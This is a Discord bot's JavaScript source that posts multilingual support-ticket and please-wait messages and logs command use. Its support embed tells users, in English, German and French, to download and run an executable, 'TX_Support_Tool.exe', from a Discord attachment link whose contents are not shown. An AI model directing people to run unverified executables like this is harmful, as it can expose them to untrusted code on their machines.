const { Client, GatewayIntentBits, EmbedBuilder, SlashCommandBuilder, REST, Routes, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

const prefix = '.';
const DEV_LOG_CHANNEL_ID = '1414044553312468992';

// Register slash command for allcmds
const commands = [
    new SlashCommandBuilder()
        .setName('allcmds')
        .setDescription('Display all available bot commands (Staff Quick Reference)')
];

const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);

(async () => {
    try {
        console.log('Started refreshing application (/) commands.');
        await rest.put(
            Routes.applicationCommands(process.env.CLIENT_ID),
            { body: commands }
        );
        console.log('Successfully reloaded application (/) commands.');
    } catch (error) {
        console.error(error);
    }
})();

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
    client.user.setPresence({
        activities: [{ name: 'Doing things others cant.', type: 4 }],
        status: 'online'
    });
});

// Create translation buttons
function createTranslationButtons() {
    return new ActionRowBuilder()
        .addComponents(
            new ButtonBuilder()
                .setCustomId('translate_en')
                .setLabel('English')
                .setStyle(ButtonStyle.Secondary)
                .setEmoji('🇺🇸'),
            new ButtonBuilder()
                .setCustomId('translate_de')
                .setLabel('Deutsch')
                .setStyle(ButtonStyle.Secondary)
                .setEmoji('🇩🇪'),
            new ButtonBuilder()
                .setCustomId('translate_fr')
                .setLabel('Français')
                .setStyle(ButtonStyle.Secondary)
                .setEmoji('🇫🇷')
        );
}

// Create embed based on command and language
function createEmbed(commandType, language = 'en') {
    let embed = new EmbedBuilder().setColor('#FFFFFF').setTimestamp();
    
    if (commandType === 'supportticket') {
        if (language === 'en') {
            embed.setTitle('📋 Support Ticket Requirements')
                .setDescription('In order to assist you efficiently, please ensure you provide the following when opening a ticket:')
                .addFields(
                    { name: '📹 Required Information', value: '• A clear, high-quality video demonstrating the issue\n• A screenshot of the error message(s)\n• The name of the product you are using\n• The version of Windows you are running\n• A screenshot of each tab within your Windows Security settings', inline: false },
                    { name: '🔧 Diagnostic Tool', value: 'Run the following diagnostic setup file and provide a screenshot when prompted:\n[TX Support Tool](https://cdn.discordapp.com/attachments/1413199327249170472/1418206411178901558/TX_Support_Tool.exe)', inline: false },
                    { name: '⚠️ Important Notes', value: '• Failure to follow these steps may result in delays or prevent us from providing effective support\n• Please ensure all requested information is submitted promptly\n• Once everything is submitted, kindly wait for an administrator to respond\n• Inactivity within the ticket may result in it being automatically closed', inline: false }
                )
                .setFooter({ text: 'Support Team • Please follow all requirements' });
        } else if (language === 'de') {
            embed.setTitle('📋 Support-Ticket Anforderungen')
                .setDescription('Um Ihnen effizient zu helfen, stellen Sie bitte beim Öffnen eines Tickets die folgenden Informationen bereit:')
                .addFields(
                    { name: '📹 Erforderliche Informationen', value: '• Ein klares, hochwertiges Video, das das Problem demonstriert\n• Ein Screenshot der Fehlermeldung(en)\n• Der Name des Produkts, das Sie verwenden\n• Die Version von Windows, die Sie verwenden\n• Ein Screenshot jedes Tabs in Ihren Windows-Sicherheitseinstellungen', inline: false },
                    { name: '🔧 Diagnose-Tool', value: 'Führen Sie die folgende Diagnose-Datei aus und stellen Sie einen Screenshot bereit:\n[TX Support Tool](https://cdn.discordapp.com/attachments/1413199327249170472/1418206411178901558/TX_Support_Tool.exe)', inline: false },
                    { name: '⚠️ Wichtige Hinweise', value: '• Das Nichtbefolgen dieser Schritte kann zu Verzögerungen führen oder uns daran hindern, effektiven Support zu bieten\n• Bitte stellen Sie sicher, dass alle angeforderten Informationen umgehend übermittelt werden\n• Warten Sie nach der Übermittlung geduldig auf die Antwort eines Administrators\n• Inaktivität im Ticket kann zur automatischen Schließung führen', inline: false }
                )
                .setFooter({ text: 'Support Team • Bitte befolgen Sie alle Anforderungen' });
        } else if (language === 'fr') {
            embed.setTitle('📋 Exigences du Ticket de Support')
                .setDescription('Afin de vous aider efficacement, veuillez vous assurer de fournir les éléments suivants lors de l\'ouverture d\'un ticket:')
                .addFields(
                    { name: '📹 Informations Requises', value: '• Une vidéo claire et de haute qualité démontrant le problème\n• Une capture d\'écran du/des message(s) d\'erreur\n• Le nom du produit que vous utilisez\n• La version de Windows que vous utilisez\n• Une capture d\'écran de chaque onglet dans vos paramètres de sécurité Windows', inline: false },
                    { name: '🔧 Outil de Diagnostic', value: 'Exécutez le fichier de configuration de diagnostic suivant et fournissez une capture d\'écran:\n[TX Support Tool](https://cdn.discordapp.com/attachments/1413199327249170472/1418206411178901558/TX_Support_Tool.exe)', inline: false },
                    { name: '⚠️ Notes Importantes', value: '• Ne pas suivre ces étapes peut entraîner des retards ou nous empêcher de fournir un support efficace\n• Veuillez vous assurer que toutes les informations demandées sont soumises rapidement\n• Une fois tout soumis, veuillez attendre patiemment qu\'un administrateur réponde\n• L\'inactivité dans le ticket peut entraîner sa fermeture automatique', inline: false }
                )
                .setFooter({ text: 'Équipe de Support • Veuillez suivre toutes les exigences' });
        }
    }
    
    if (commandType === 'pleasewait') {
        if (language === 'en') {
            embed.setTitle('⏳ Please Wait')
                .setDescription('Thank you for your patience. No support staff are currently active.')
                .addFields(
                    { name: '🕐 Support Hours', value: 'Our support team will be back online shortly. Please wait for a staff member to assist you.', inline: false },
                    { name: '📝 Important', value: 'Please do not spam or create multiple tickets. Your request has been received and will be handled in order.', inline: false },
                    { name: '🔔 Notification', value: 'You will be notified when a support representative is available to help you.', inline: false }
                )
                .setFooter({ text: 'Support Team • Please Wait for Assistance' });
        } else if (language === 'de') {
            embed.setTitle('⏳ Bitte Warten')
                .setDescription('Vielen Dank für Ihre Geduld. Derzeit ist kein Support-Personal aktiv.')
                .addFields(
                    { name: '🕐 Support-Zeiten', value: 'Unser Support-Team wird in Kürze wieder online sein. Bitte warten Sie auf einen Mitarbeiter, der Ihnen hilft.', inline: false },
                    { name: '📝 Wichtig', value: 'Bitte spammen Sie nicht oder erstellen Sie mehrere Tickets. Ihre Anfrage wurde erhalten und wird der Reihe nach bearbeitet.', inline: false },
                    { name: '🔔 Benachrichtigung', value: 'Sie werden benachrichtigt, wenn ein Support-Vertreter verfügbar ist, um Ihnen zu helfen.', inline: false }
                )
                .setFooter({ text: 'Support-Team • Bitte Warten auf Unterstützung' });
        } else if (language === 'fr') {
            embed.setTitle('⏳ Veuillez Patienter')
                .setDescription('Merci de votre patience. Aucun membre du support n\'est actuellement actif.')
                .addFields(
                    { name: '🕐 Heures de Support', value: 'Notre équipe de support sera de retour en ligne sous peu. Veuillez attendre qu\'un membre du personnel vous aide.', inline: false },
                    { name: '📝 Important', value: 'Veuillez ne pas spammer ou créer plusieurs tickets. Votre demande a été reçue et sera traitée dans l\'ordre.', inline: false },
                    { name: '🔔 Notification', value: 'Vous serez notifié lorsqu\'un représentant du support sera disponible pour vous aider.', inline: false }
                )
                .setFooter({ text: 'Équipe de Support • Veuillez Attendre l\'Assistance' });
        }
    }
    
    return embed;
}

// Logging System
async function logCommandUsage(user, commandName, startTime) {
    const endTime = Date.now();
    const responseTime = endTime - startTime;
    
    const devChannel = client.channels.cache.get(DEV_LOG_CHANNEL_ID);
    if (devChannel) {
        const logEmbed = new EmbedBuilder()
            .setColor(responseTime > 3000 ? '#FF6B6B' : responseTime > 1000 ? '#FFE66D' : '#4ECDC4')
            .setTitle('📊 Command Usage Log')
            .addFields(
                { name: '👤 User', value: `${user.username}\n\`${user.id}\``, inline: true },
                { name: '⚡ Command', value: `\`.${commandName}\``, inline: true },
                { name: '⏱️ Response Time', value: `${responseTime}ms`, inline: true },
                { name: '📅 Timestamp', value: `<t:${Math.floor(endTime/1000)}:F>`, inline: false }
            )
            .setFooter({ text: responseTime > 3000 ? '⚠️ SLOW RESPONSE' : responseTime > 1000 ? '⚡ MODERATE RESPONSE' : '✅ FAST RESPONSE' })
            .setTimestamp();
            
        try {
            await devChannel.send({ embeds: [logEmbed] });
        } catch (error) {
            console.error('Failed to send log:', error);
        }
    }
}

client.on('interactionCreate', async (interaction) => {
    try {
        if (interaction.isChatInputCommand()) {
            const { commandName } = interaction;

            if (commandName === 'allcmds') {
                const allCmdsEmbed = new EmbedBuilder()
                    .setColor('#FFFFFF')
                    .setTitle('🤖 All Bot Commands - Staff Guide')
                    .setDescription('Simplified command system with translation buttons.')
                    .addFields(
                        { name: '📋 Available Commands', value: '`.supportticket` - Support requirements\n`.pleasewait` - Please wait message\n`.allcmds` - Command list', inline: false },
                        { name: '🌍 Translation System', value: 'All commands include translation buttons (🇺🇸 🇩🇪 🇫🇷) for instant language switching', inline: false }
                    )
                    .setFooter({ text: 'Commands auto-delete your message and show translation buttons' })
                    .setTimestamp();

                await interaction.reply({ embeds: [allCmdsEmbed], ephemeral: true });
            }
        }

        if (interaction.isButton()) {
            const [action, language] = interaction.customId.split('_');
            
            if (action === 'translate') {
                const originalEmbed = interaction.message.embeds[0];
                let commandType = '';
                
                if (originalEmbed.title.includes('Support Ticket') || originalEmbed.title.includes('Support-Ticket') || originalEmbed.title.includes('Ticket de Support')) {
                    commandType = 'supportticket';
                } else if (originalEmbed.title.includes('Please Wait') || originalEmbed.title.includes('Bitte Warten') || originalEmbed.title.includes('Veuillez Patienter')) {
                    commandType = 'pleasewait';
                }

                if (commandType) {
                    const newEmbed = createEmbed(commandType, language);
                    const buttons = createTranslationButtons();
                    
                    await interaction.update({ embeds: [newEmbed], components: [buttons] });
                }
            }
        }
    } catch (error) {
        console.error('Interaction error:', error);
    }
});

client.on('messageCreate', async (message) => {
    if (!message.content.startsWith(prefix) || message.author.bot) return;

    const startTime = Date.now();
    const args = message.content.slice(prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    try {
        if (command === 'supportticket') {
            const embed = createEmbed('supportticket', 'en');
            const buttons = createTranslationButtons();
            
            await message.delete();
            await message.channel.send({ embeds: [embed], components: [buttons] });
            logCommandUsage(message.author, 'supportticket', startTime);
        }

        if (command === 'pleasewait') {
            const embed = createEmbed('pleasewait', 'en');
            const buttons = createTranslationButtons();
            
            await message.delete();
            await message.channel.send({ embeds: [embed], components: [buttons] });
            logCommandUsage(message.author, 'pleasewait', startTime);
        }

        if (command === 'allcmds') {
            const allCmdsEmbed = new EmbedBuilder()
                .setColor('#FFFFFF')
                .setTitle('🤖 All Bot Commands')
                .setDescription('Complete list of available bot commands.')
                .addFields(
                    { name: '📋 Commands', value: '`.supportticket` - Support requirements with translations\n`.pleasewait` - Please wait message with translations\n`.allcmds` - This command list', inline: false },
                    { name: '🌍 Translation Feature', value: 'All commands include translation buttons (🇺🇸 🇩🇪 🇫🇷)', inline: false }
                )
                .setFooter({ text: 'Commands auto-delete your message' })
                .setTimestamp();

            await message.delete();
            await message.channel.send({ embeds: [allCmdsEmbed] });
            logCommandUsage(message.author, 'allcmds', startTime);
        }

    } catch (error) {
        console.error('Command error:', error);
    }
});

client.login(process.env.DISCORD_TOKEN);
